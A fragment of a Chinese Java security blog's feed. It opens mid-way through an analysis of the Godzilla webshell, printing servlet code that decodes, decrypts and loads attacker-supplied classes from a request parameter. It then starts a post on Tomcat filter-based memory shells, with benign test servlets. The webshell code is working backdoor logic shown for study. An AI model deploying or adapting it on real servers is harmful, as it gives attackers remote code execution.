        defMethod&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; defMethod&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;urlClassLoader&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; classBytes&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; classBytes&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token annotation punctuation&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;doPost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServletRequest&lt;/span&gt; req&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HttpServletResponse&lt;/span&gt; resp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pass&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;  
                payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;defClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;//用于第一次接受请求初始化payload&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ByteArrayOutputStream&lt;/span&gt; arrOut &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arrOut&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//                Object f = payload.newInstance(); &lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;basic.payload&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;//本地加载payload，用于动态调试&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arrOut&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;md5&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;base64Encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arrOut&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toByteArray&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;md5&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Throwable&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在哥斯拉主界面，点击测试会在burp发送两次请求，然后哥斯拉会弹框出现Success，这时候再点击确定，哥斯拉会发起第三次请求，先分析这三次请求的数据包以及哥斯拉都做了什么事情。&lt;br&gt;&lt;img src=&quot;/2022/05/17/godzilla/1.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;第一次请求&quot;&gt;&lt;a href=&quot;#第一次请求&quot; class=&quot;headerlink&quot; title=&quot;第一次请求&quot;&gt;&lt;/a&gt;第一次请求&lt;/h3&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全笔记(3)-内存马之Filter型</title>
    <link href="https://jkme.github.io/2022/04/14/memory-shell-1.html"/>
    <id>https://jkme.github.io/2022/04/14/memory-shell-1.html</id>
    <published>2022-04-13T16:00:00.000Z</published>
    <updated>2022-04-22T07:21:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p><img src="/2022/04/14/memory-shell-1/Servlet.png"></p><p>当处理请求的时候：请求 → Listener → Filter → Servlet</p><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>Listener也称之为监听器，可以监听Application、Session和Request对象的创建、销毁事件，以及监听对其中添加、修改、删除属性事件，并自动执行自定义的功能。</p><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><p>Filter也称之为过滤器，可以动态地修改HttpServletRequest，HttpServletResponse中的头和数据。</p><h4 id="Servlet-1"><a href="#Servlet-1" class="headerlink" title="Servlet"></a>Servlet</h4><p>Servlet是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。Servlet 可以理解为某一个路径后续的业务处理逻辑。</p><p>Tomcat是http服务器+servlet容器，当Tomcat作为Servlet容器的时候，讲http请求文本解析之后封装成<code>HttpServletRequest</code>类型的request对象，传递给Servlet，同时讲相应的信息封装为<code>HttpServletResponse</code>类型的response对象，将response对象交给tomcat，tomcat格式化之后返回给浏览器</p><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h4 id="容器组件（Container）"><a href="#容器组件（Container）" class="headerlink" title="容器组件（Container）"></a>容器组件（Container）</h4><p>Tomcat有四种类型的Servlet容器组件，从上到下：</p><ol><li>Engine：<code>org.apache.catalina.core.StandardEngine</code><ul><li>最顶层容器组件，其下可以包含多个Host</li></ul></li><li>Host: <code>org.apache.catalina.core.StandardHost</code><ul><li>一个Host代表一个虚拟主机，其下可以包含多个 Context。</li></ul></li><li>Context: <code>org.apache.catalina.core.StandardContext</code><ul><li>一个Context 代表一个Web应用，其下可以包含多个 Wrapper</li></ul></li><li>Wrapper: <code>org.apache.catalina.core.StandardWrapper</code><ul><li>一个Wrapper 代表一个Servlet</li></ul></li></ol><p>每个Host下可以有多个Context（Context是Host的子容器），每个Context都代表一个具体的Web应用，都有一个唯一的路径就相当于下图中的<code>/shop/manager</code>这种，在一个 Context下可以有着多个Wrapper, Wrapper主要负责管理Servlet, 包括的Servlet的装载、初始化、执行以及资源回收</p><p><img src="/2022/04/14/memory-shell-1/1.png"></p><h2 id="Context"><a href="#Context" class="headerlink" title="*Context"></a>*Context</h2><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><p>在<code>javax.servlet.ServletContext</code>里面，Servlet规定了<code>ServletContext</code>接口:<br><img src="/2022/04/14/memory-shell-1/2.png"></p><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>在<code>org.apache.catalina.core.ApplicationContext</code>里面，<code>ApplicationContext</code>类是<code>ServletContext</code>的接口实现，<code>ApplicationContext</code>类的实例和<code>StandardContext</code>的每个实例相关联，比如向<code>StandardContext</code>实例添加<code>fiterDef</code>等<br><img src="/2022/04/14/memory-shell-1/3.png"></p><h4 id="StanderContext"><a href="#StanderContext" class="headerlink" title="StanderContext"></a>StanderContext</h4><p><code>org.apache.catalina.Context</code>的默认标准实现为<code>org.apache.catalina.core.StandardContext</code>，表示每一个web应用</p><h2 id="Tomcat下Filter的实现逻辑"><a href="#Tomcat下Filter的实现逻辑" class="headerlink" title="Tomcat下Filter的实现逻辑"></a>Tomcat下Filter的实现逻辑</h2><h3 id="Filter的初始化"><a href="#Filter的初始化" class="headerlink" title="Filter的初始化"></a>Filter的初始化</h3><p>在IDEA里面新建项目之后新增测试代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TestFilter.java</span><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Filter Exec init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Filter Exec doFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TestServlet.java</span><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"TestServlet"</span><span class="token punctuation">,</span> urlPatterns <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/TestServlet"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello GET~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token 